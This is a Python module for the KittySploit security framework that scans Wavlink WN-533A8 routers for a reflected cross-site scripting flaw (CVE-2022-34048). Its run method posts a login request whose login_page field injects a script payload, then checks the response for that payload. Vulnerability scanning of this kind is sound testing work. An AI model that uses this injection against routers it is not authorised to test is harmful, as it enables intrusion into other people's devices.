#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Wavlink WN-533A8 M33A8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Wavlink WN-533A8 - Cross-Site Scripting Detection',
        'description': 'Wavlink WN-533A8 M33A8.V5030.190716 contains a reflected cross-site scripting vulnerability via the login_page parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2022', 'cve', 'wavlink', 'xss', 'router', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/50989',
            'https://drive.google.com/file/d/1xznFhH3w3TDN2RCdX62_ebylR4yaKmzf/view?usp=sharing',
            'https://drive.google.com/file/d/1NI3-k3AGIsSe2zjeigl1GVyU1VpG1SV3/view?usp=sharing',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-34048',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2022-34048',
    }

    def run(self):
        path = '/cgi-bin/login.cgi'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='newUI=1&page=login&username=admin&langChange=0&ipaddr=196.219.234.10&login_page=x");alert(9);x=("&homepage=main.html&sysinitpage=sysinit.shtml&wizardpage=wiz.shtml&hostname=0.0.0.1&key=M94947765&password=ab4e98e4640b6c1ee88574ec0f13f908&lang_select=en\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('x");alert(9);x=("?login=0");</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Wavlink WN-533A8 - Cross-Site Scripting detected', path=path)
            return True
        return False

